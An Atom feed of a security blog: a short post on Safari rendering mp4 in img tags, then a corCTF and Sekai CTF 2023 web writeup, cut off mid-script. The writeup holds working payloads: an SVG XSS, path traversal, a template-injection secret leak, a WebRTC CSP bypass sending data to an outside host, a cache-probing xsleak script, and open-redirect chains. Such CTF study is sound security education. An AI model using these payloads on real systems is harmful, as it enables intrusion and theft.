<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2023-09-11T13:29:47.865Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  
  
  <entry>
    <title>TIL:img src also supports mp4 (Safari only)</title>
    <link href="https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/"/>
    <id>https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/</id>
    <published>2023-09-11T13:10:00.000Z</published>
    <updated>2023-09-11T13:36:55.327Z</updated>
    
    <content type="html"><![CDATA[<p>Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.</p><p>However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.</p><span id="more"></span><p>Therefore, many websites have started using the <code>&lt;video&gt;</code> tag to display these animated images. By converting them to the mp4 format, the file size can be significantly reduced. However, there are some downsides to using the <code>&lt;video&gt;</code> tag instead of <code>&lt;img&gt;</code>, such as the lack of native support for lazy loading and other inconveniences.</p><p>During my research, I unexpectedly discovered that Safari actually supports mp4 in the <code>&lt;img&gt;</code> tag! This means you can do the following:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This feature has been available since 2017: <a href="https://bugs.webkit.org/show_bug.cgi?id=176825">Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation</a></p><p>I found out about this in the following article: <a href="https://calendar.perfplanet.com/2017/animated-gif-without-the-gif/">Evolution of &lt;img&gt;: Gif without the GIF</a></p><p>If <code>&lt;img&gt;</code> can also support mp4, we can take advantage of the benefits of both tags without having to switch tags. We can have lazy loading support and significantly reduce the file size.</p><p>Unfortunately, this feature is only supported in Safari. Even after six years, I haven’t seen this functionality in Chromium or Firefox, and it seems unlikely to be implemented in the future.</p><p>Chromium has explicitly stated that it will not support this feature. The discussion thread can be found here: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791658">Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;</a>. It was marked as “Wont fix” in 2018, with the following reason:</p><pre class="line-numbers language-none"><code class="language-none">Closing as WontFix per c#35, due to the following:- The widespread adoption of WebP (addresses CDN use case)- Forthcoming AV1 based image formats (ditto).- Memory inefficiency with allowing arbitrary video in image.- Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The first point mentioned that WebP actually has an Animated WebP format that can be used within the <code>&lt;img src&gt;</code> tag and is also animated. It has even smaller file sizes. For more information on the pros and cons, you can refer to Google’s own documentation: <a href="https://developers.google.com/speed/webp/faq?hl=en#why_should_i_use_animated_webp">What are the benefits of using animated WebP?</a></p><p>The second point mentions that the newer image format AVIF also has Animated AVIF, which also supports animated images.</p><p>If these new image formats can replace GIFs, it seems that there is no real need to use mp4.</p><p>As for Firefox, although they haven’t explicitly stated that they won’t implement this feature, the issue hasn’t seen much activity for a long time: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=895131">Add support for video formats in &lt;img&gt;, behaving like animated gif</a></p><p>Some people hope to add this feature to the specification, but there hasn’t been much progress for a while: <a href="https://github.com/whatwg/html/issues/7141">Require img to be able to load the same video formats as video supports #7141</a></p><p>In conclusion, it seems that this feature will only be available in Safari.</p><p>Unfortunately, the image service I am using only supports converting GIFs to mp4 and does not support converting to animated WebP or animated AVIF, which would have been very convenient.</p><h2><span id="summary">Summary</span></h2><p>If you want to continue using <code>&lt;img&gt;</code> for animated images, the most comprehensive approach would be to use the <code>&lt;picture&gt;</code> tag with multiple file formats, like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/avif<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.avif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.webp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This ensures that the results are displayed correctly on every browser and selects the image with usually smaller file size.</p><p>I tried it out myself with a simple gif that had an original size of 75 KB:</p><p><img src="/img/mp4-in-img-src/test.gif" alt="gif"></p><p>After converting it to WebP, it became 58 KB (-22.6%):</p><p><img src="/img/mp4-in-img-src/test.webp" alt="webp"></p><p>Converting it to mp4 reduced the size to 17 KB (-77.3%):</p><p><img src="/img/mp4-in-img-src/test.mp4" alt="Only supported by Safari, may not display properly"></p><p>Converting it to AVIF reduced the size to 11 KB (-85.3%):</p><p><img src="/img/mp4-in-img-src/test.avif" alt="AVIF format, may not be supported by newer browsers"></p><p>It seems that the latest file formats are quite impressive, reducing the size significantly.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.&lt;/p&gt;
&lt;p&gt;However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>corCTF 2023 &amp; Sekai CTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/</id>
    <published>2023-09-02T06:10:44.000Z</published>
    <updated>2023-09-02T06:32:20.275Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.</p><p>As usual, here are the keywords I noted:</p><ol><li>GraphQL batch query + alias</li><li>Python os.path.join absolute path</li><li>Svg XSS, foreignObject</li><li>WebRTC CSP bypass</li><li>Status code xsleak</li><li>DNS rebinding</li><li>nmap command injection</li><li>Ruby rack file upload temporary storage</li><li>buildConstraintViolationWithTemplate EL injection</li><li>Request smuggling</li><li>document.baseURI</li><li>200&#x2F;404 status code xsleak</li></ol><span id="more"></span><h2><span id="corctf-2023">corCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web">https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web</a><br>Write-ups for some of the web challenges: <a href="https://brycec.me/posts/corctf_2023_challenges">https://brycec.me/posts/corctf_2023_challenges</a></p><h3><span id="force-118-solves">force (118 solves)</span></h3><p>The PIN code has 10,000 possible values, and you need to find the correct value within 10 requests using a GraphQL query.</p><p>The solution is to use batch query + alias, which allows you to try multiple times within a single request (taken from the article below):</p><pre class="line-numbers language-none"><code class="language-none">&#123;  flag0:flag(pin:0),  flag1:flag(pin:1),  flag2:flag(pin:2),  flag3:flag(pin:3),  flag4:flag(pin:4),  flag5:flag(pin:5)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Write-ups by others:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/force/">https://siunam321.github.io/ctf/corCTF-2023/web/force/</a></li><li><a href="https://github.com/hanzotaz/corctf2023_writeup/">https://github.com/hanzotaz/corctf2023_writeup&#x2F;</a></li></ol><h3><span id="msfrognymize-64-solves">msfrognymize (64 solves)</span></h3><p>The key is in this piece of code:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/anonymized/&lt;image_file>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve_image</span><span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> file_path <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Image </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> cannot be found."</span></span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python’s <code>os.path.join</code> has a well-known behavior where it ignores everything before the absolute path:</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;)&#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39;&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;)&#39;&#x2F;test.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, by leveraging this behavior, you can achieve arbitrary file reading and obtain the flag.</p><p>Reference: <a href="https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/">https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/</a></p><h3><span id="frogshare-33-solves">frogshare (33 solves)</span></h3><p>This challenge uses a library called <a href="https://github.com/shubhamjain/svg-loader">svg-loader</a>, which automatically loads an SVG URL. Therefore, this challenge is based on SVG XSS.</p><p>During the import, for security reasons, scripts and inline scripts are automatically removed, but <code>&lt;foreignObject&gt;</code> is overlooked. This tag allows you to load HTML inside an SVG, and it can be bypassed by using iframe srcdoc:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>alert(document.domain)<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next, you need to bypass CSP. In this challenge, <code>&lt;base&gt;</code> is used to change the location of script loading.</p><p>References:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/">https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/</a></li></ol><p>Renwa’s solution involves rebuilding the app inside an iframe and inserting a script using Next.js features: <a href="https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd">https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd</a></p><h3><span id="youdirect-5-solves">youdirect (5 solves)</span></h3><p>This challenge is about finding an open redirect on YouTube.</p><p>@EhhThing provided a solution (clicking will log you out) that involves two layers of open redirect:</p><p><a href="https://youtube.com/logout?continue=http://googleads.g.doubleclick.net/pcs/click?adurl=https://webhook.site/ccb8a675-14cb-419c-9e85-3b709a99e394">https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394</a></p><p>@pew provided:<br><a href="https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew">https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew</a></p><p>@Josh provided:<br><a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https://sheiwknajaka.free.beeceptor.com/&v=-5Rm9ymMTRA&html_redirect=1">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1</a></p><p>This one is special. In fact, each link in the YouTube video description generates a redirect link, but they are bound to session IDs on the webpage. Therefore, if you switch devices, you cannot use them. However, this link was generated on the mobile app, which may be because the mobile app does not have cookies and is not restricted. Interesting.</p><h3><span id="crabspace-4-solves">crabspace (4 solves)</span></h3><p>The first step is to use tera’s SSTI to leak environment variables: <code>&#123;&#123; get_env(name="SECRET") &#125;&#125;</code></p><p>Then, you can bypass CSP using WebRTC:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    c<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">iceServers</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">urls</span><span class="token operator">:</span><span class="token string">"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>With these two steps, you can forge an admin session and obtain the flag.</p><p>References:</p><ol><li><a href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/">corCTF 2023 web&#x2F;crabspace Writeup</a></li></ol><h3><span id="leakynote-3-solves">leakynote (3 solves)</span></h3><p>This challenge was solved during the competition. In simple terms, it provides a free HTML injection and a strict CSP:</p><pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>There is also a search API that returns 200 for success and 404 for failure. The goal is to find a way to leak the flag using this API.</p><p>One of the key points of this challenge is that the CSP header is added by nginx, and nginx only adds the header for 2xx and 3xx responses. Therefore, if the search fails and returns 404, the page will not have a CSP.</p><p>So, I came up with a cache probing method.</p><p>We insert <code>&lt;iframe src=search?q=a&gt;</code> into the note. If nothing is found, there is no CSP, so the content of the iframe will be loaded, and the CSS on the page will also be loaded. On the other hand, because it violates the CSP, nothing will be loaded.</p><p>Therefore, we can use the “whether CSS is cached” point to determine if the search found anything.</p><p>At that time, the implemented code was as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"no-cors"</span><span class="token punctuation">,</span>      <span class="token literal-property property">signal</span><span class="token operator">:</span> signal<span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'reload'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// open note page</span>    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">// wait 1s</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token comment">// clear cache and wait again</span>    <span class="token keyword">await</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>    <span class="token comment">// now the iframe should load, do cache probing</span>    <span class="token keyword">const</span> now <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'force-cache'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;ms=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>end<span class="token operator">-</span>now<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>now <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/maybe/'</span> <span class="token operator">+</span> title<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// cached(no result) => 2~3ms</span>    <span class="token comment">// no cache(found) => 4.8~5.8ms</span>    w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// copy paste the following from python script</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;a'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=c9193aee91b0fc29'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;c'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;d'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=0c6caa61575b9478'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;e'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;f'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=71652df64d54c0e4'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;g'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=354f3bec25e02332'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;k'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=066aa475493e1a4c'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;l'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=54a12f7b11098d2a'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;o'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=621591145bcfc8e0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;r'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=6b44725cb5e274f0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;t'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=e025b26e5e7117a1'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;y'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=f10001d89230485e'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;z'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" 